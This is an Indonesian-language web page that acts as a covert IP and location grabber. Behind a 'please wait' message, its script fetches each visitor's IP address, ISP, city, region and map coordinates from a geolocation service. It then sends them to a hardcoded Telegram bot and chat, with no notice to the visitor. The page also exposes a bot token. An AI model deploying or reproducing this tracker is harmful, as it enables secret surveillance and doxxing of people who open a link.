<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Deteksi IP & Lokasi</title>
</head>
<body>
  <h2>Mohon tunggu sebentar...</h2>

  <script>
    // Ganti ini pakai bot kamu sendiri
    const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
    const CHAT_ID = '7218964278';

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        const message = `
IP: ${data.ip}
ISP: ${data.org}
Negara: ${data.country_name}
Kota: ${data.city}
Region: ${data.region}
Lokasi: https://maps.google.com/?q=${data.latitude},${data.longitude}
        `;
        
        // Kirim ke Telegram
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        document.body.innerHTML = "<h2>Script berhasil diaktifkan!</h2>";
      })
      .catch(err => {
        document.body.innerHTML = "<h2>Gagal mendapatkan data.</h2>";
      });
  </script>
</body>
</html>
